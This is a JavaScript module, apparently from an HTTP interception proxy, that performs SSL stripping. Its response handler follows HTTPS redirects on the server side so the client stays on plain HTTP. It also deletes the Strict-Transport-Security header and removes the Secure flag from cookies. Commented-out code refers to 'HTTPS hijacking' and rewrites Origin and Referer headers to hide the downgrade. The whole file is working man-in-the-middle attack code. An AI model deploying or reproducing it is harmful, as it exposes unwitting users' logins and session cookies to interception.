'use strict';

var mApp;

/*
function isFakeUrl(url) {
	return url.indexOf('ssl=1') >= 0;
}

function restoreUrl(url) {
	return url
		.replace(/^http:\/\//i, 'https://')
		.replace(/[?&]ssl=1/, '');
}*/


exports.init = function(app) {
	mApp = app;
	//mApp.msg.on('WebReqBegin', handleWebReqBegin);
	mApp.msg.on('WebResBegin', handleWebResBegin);
	return true;
};


function handleWebReqBegin(e) {
/*
	var headers = req.headers;

	//
	// 替换origin字段
	//
	if (ssl) {
		var origin = headers['origin'];
		if (origin) {
			headers['origin'] = origin.replace(/^http:\/\//i, 'https://');
		}
	}

	//
	// 修正referer
	// HTTPS劫持下所有页面都是HTTP，因此会暴露referer
	//
	var referer = headers['referer'];
	if (referer && isFakeUrl(referer)) {
		headers['referer'] = restoreUrl(referer);
	}*/
};


function handleWebResBegin(e) {

	var res = e.serverRes;
    var headers = res.headers;
    
	//
	// 检测是否重定向到 https 站点
	//
	var status = res.statusCode;
	if (300 < status && status < 400) {

		var newUrl = headers['location'];
		if (newUrl && /^https:\/\//i.test(newUrl)) {

			mApp.util.warn('[WEB]', e.fullUrl, 'GOTO'.red, newUrl);

			var newSite = mApp.util.getSiteFromUrl(newUrl);
			e.clientReq.headers.host = newSite;
			e.proxy();
			return false;
		}
	}

    // 删除 HSTS
    delete headers['strict-transport-security'];

	// 过滤 cookie 的 Secure 标记
	var cookies = headers['set-cookie'];
	if (cookies) {
		for(var i = cookies.length - 1; i >= 0; i--) {
			var pos = cookies[i].indexOf('; Secure');
			if (pos != -1) {
				cookies[i] = cookies[i].substr(0, pos);
			}
		}
	}
};
